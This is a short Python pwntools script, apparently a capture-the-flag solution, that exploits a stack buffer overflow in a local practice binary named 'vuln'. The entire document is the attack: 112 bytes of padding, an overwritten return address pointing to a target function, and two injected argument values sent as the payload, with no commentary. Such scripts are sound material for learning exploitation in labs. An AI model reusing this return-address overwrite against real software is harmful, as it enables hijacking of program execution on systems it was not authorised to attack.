#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Please enter your string: \n")

payload = (
    "A" * 112 +
    p32(0x80485cb) +
    "B" * 4 +
    p32(0xDEADBEEF) +
    p32(0xDEADC0DE)
)
r.sendline(payload)
print(r.recvall())


